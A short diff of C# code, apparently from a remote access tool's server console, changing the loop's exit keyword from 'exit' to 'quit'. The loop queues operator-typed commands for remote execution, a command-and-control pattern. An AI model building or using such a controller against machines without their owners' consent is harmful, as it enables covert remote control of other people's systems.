@@ -20,7 +20,7 @@ Task socketListenerTask = RatServerListener.StartListening();
 while (true) {
     Console.Write("Enter command: ");
     string command = Console.ReadLine() ?? "";
-    if (command == "exit") {
+    if (command == "quit") {
         break;
     }
     RatServerListener.CommandsToRun.Add(command);
